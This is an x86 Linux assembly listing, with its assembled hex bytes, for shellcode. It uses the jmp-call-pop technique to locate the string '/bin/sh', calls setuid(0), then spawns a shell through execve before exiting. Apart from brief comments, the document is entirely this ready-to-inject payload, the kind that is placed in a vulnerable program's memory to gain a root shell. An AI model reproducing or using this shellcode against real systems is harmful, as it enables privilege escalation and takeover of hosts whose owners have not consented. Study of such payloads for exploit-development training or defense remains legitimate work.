global _start
_start:
xor	eax, eax

jmp short string
code:

; clear all the registers
xor		eax, eax
xor		ebx, ebx
xor		ecx, ecx
xor		edx, edx




; store pointer to /bin/sh in ebx
pop		ebx


push 	ebx
push	0x17
pop 	eax
xor		ebx, ebx
int		0x80
xor eax, eax
pop		ebx

;push	0x2e	
;pop		eax
;push	ebx
;int		0x80



; put a null on the stack and then the address to /bin/sh
push		eax
push		ebx

; *Addr of /bin/sh
; NULL

; esp points to the top of the stack
; hence it points to the address of /bin/sh and a null
mov		ecx, esp

; put a null on the stack and use the same esp trick
; to make edx point to null
push eax
mov 		edx, esp

mov		al, 0xb ; execve
int 		0x80



mov		ebx, 0x0
mov 	eax, 0x1
int		0x80

string:
call code
db	'/bin/sh', 0x0




31c0eb2b31c031db31c931d25b536a175831dbcd8031c05b505389e15089e2b00bcd80bb00000000b801000000cd80e8d0ffffff2f62696e2f7368








